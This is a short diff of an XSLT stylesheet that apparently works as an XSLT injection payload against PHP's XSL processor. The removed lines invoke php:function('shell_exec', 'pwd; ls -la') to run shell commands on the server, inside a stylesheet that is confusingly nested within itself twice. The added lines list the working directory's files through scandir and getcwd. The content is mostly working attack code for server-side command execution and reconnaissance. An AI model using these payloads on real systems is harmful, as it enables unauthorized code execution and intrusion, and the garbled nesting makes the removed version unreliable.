@@ -9,42 +9,8 @@
     <html>
       <body>
         <pre>
-PWD:
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns:php="http://php.net/xsl">
-
-  <xsl:output method="html"/>
-
-  <xsl:template match="/">
-    <html>
-      <body>
-        <pre>
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns:php="http://php.net/xsl">
-
-  <xsl:output method="html"/>
-
-  <xsl:template match="/">
-    <html>
-      <body>
-        <pre>
-<xsl:value-of select="php:function('shell_exec', 'pwd; ls -la')" />
-        </pre>
-      </body>
-    </html>
-  </xsl:template>
-
-</xsl:stylesheet>
-        </pre>
-      </body>
-    </html>
-  </xsl:template>
-
-</xsl:stylesheet>
+FILES:
+<xsl:value-of select="php:function('implode', '&#10;', php:function('scandir', php:function('getcwd')))" />
         </pre>
       </body>
     </html>
